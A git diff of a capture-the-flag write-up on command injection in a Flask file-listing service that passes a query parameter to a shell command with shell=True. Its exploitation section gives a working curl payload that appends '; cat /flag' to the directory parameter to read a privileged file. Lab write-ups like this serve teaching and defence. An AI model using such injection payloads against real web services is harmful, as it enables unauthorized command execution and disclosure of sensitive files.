@@ -1,4 +1,7 @@
-## CMDi 1 
+# CMDi 1 
+
+## Challenge Description
+The target is a Flask-based web service that lists files in a user-specified directory via a query parameter. Internally, it executes a shell command using Python’s `subprocess.run()`:
 
 server code:
 ```
@@ -43,12 +46,29 @@ app.config["SERVER_NAME"] = "challenge.localhost:80"
 app.run("challenge.localhost", 80)
 ```
 
-答案:
+## Vulnerability
+
+The user input (directory) is directly inserted into a shell command.
+
+The command is executed with shell=True, allowing shell metacharacters like ; to chain commands.
+
+The server is run with elevated privileges using exec-suid, meaning it can access privileged files like /flag.
+
+
+## Exploitation:
+
+By injecting ; cat /flag into the directory parameter, we can execute an unintended command:
+
 ```
 curl "http://challenge.localhost:80/resource?directory=/flag;%20cat%20/flag"
 ```
 
-上面的payload等價於:
+This gets interpreted by the shell as:
+
 ```
-GET /resource?directory=/flag; cat /flag
+ls -l /flag; cat /flag
 ```
+
+## Conclusion
+
+This was a classic command injection vulnerability. By injecting shell syntax into a query parameter, we chained an unintended cat /flag command, which was executed due to unsafe use of shell=True. Because the server ran with elevated privileges, this allowed reading and leaking of a sensitive file.
